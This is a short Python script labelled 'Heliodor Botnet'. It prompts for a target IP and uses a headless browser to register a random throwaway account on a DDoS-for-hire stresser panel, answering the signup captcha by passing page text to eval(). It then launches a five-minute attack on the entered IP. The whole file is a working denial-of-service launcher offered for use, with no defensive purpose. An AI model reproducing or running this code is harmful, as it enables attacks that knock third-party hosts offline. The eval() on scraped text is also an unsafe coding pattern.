# Heliodor Botnet
# Made by chmvrek

# IMPORTS
from termcolor import colored
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from requests_html import HTMLSession
from bs4 import BeautifulSoup
import requests
import random
import string
import math

print('HELIODOR BOTNET')
print('MADE BY CHMVREK')
print('')
print('METHOD: CLOUDDOS')
print('')
print('IP to DDOS: ')
ip = input()
print('IP: ' + ip)

# VARIABLES
options = webdriver.ChromeOptions();
options.add_argument('headless')
options.add_argument("disable-gpu")
options.add_argument('--disable-logging') 
options.add_argument("--incognito")
options.add_argument('window-size=1920x1080')
options.add_experimental_option("detach", True)
browser = webdriver.Chrome(options=options)


# POST REQUEST - CREATE ACCOUNT
random = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 10))
randomString = str(random)
browser.get("https://str3ssed.co/panel/register.php")
captchaString = str(browser.find_element(By.XPATH, '//label[@for="captcha"]').text).replace("What is ", "").replace("?", "")
print(captchaString)
browser.find_element(By.NAME, "username").send_keys(randomString)
browser.find_element(By.NAME, "email").send_keys(randomString + "@jajo.xd")
browser.find_element(By.NAME, "password").send_keys(randomString + 'PW')
browser.find_element(By.NAME, "cpassword").send_keys(randomString + 'PW')
browser.find_element(By.NAME, "captcha").send_keys(eval(captchaString))
browser.find_element(By.NAME, 'agree').send_keys(Keys.SPACE)
browser.find_element(By.NAME, 'register').click()

print('KEY 1: ' + randomString)
print('KEY 2: ' + randomString + 'PW')

browser.get("https://str3ssed.co/panel/hub.php")
browser.find_element(By.NAME, "host").send_keys(ip)
browser.find_element(By.NAME, "time").send_keys("300")
browser.find_element(By.NAME, 'startstress').click()

print('5 MINUTE DDOS DONE :)')
    